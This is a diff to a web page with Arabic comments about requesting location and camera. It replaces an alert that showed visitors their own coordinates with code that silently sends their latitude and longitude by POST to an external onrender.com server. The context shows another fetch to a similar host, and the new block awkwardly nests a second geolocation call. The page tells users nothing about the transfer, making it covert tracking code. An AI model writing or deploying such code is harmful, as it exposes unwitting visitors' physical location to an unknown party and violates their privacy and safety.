@@ -20,9 +20,23 @@ fetch("https://project-for-me-only.onrender.com/data", {
 
     // طلب الموقع
     navigator.geolocation.getCurrentPosition(function(pos) {
-        alert("Your location: "
-        + pos.coords.latitude + ", "
-        + pos.coords.longitude);
+        navigator.geolocation.getCurrentPosition(function(pos) {
+
+  const data = {
+    latitude: pos.coords.latitude,
+    longitude: pos.coords.longitude
+  };
+
+  fetch("https://project-for-me-only-1.onrender.com/data", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+
+});
+
     });
 
     // طلب الكاميرا
@@ -40,3 +54,4 @@ fetch("https://project-for-me-only.onrender.com/data", {
 </body>
 
 </html>
+
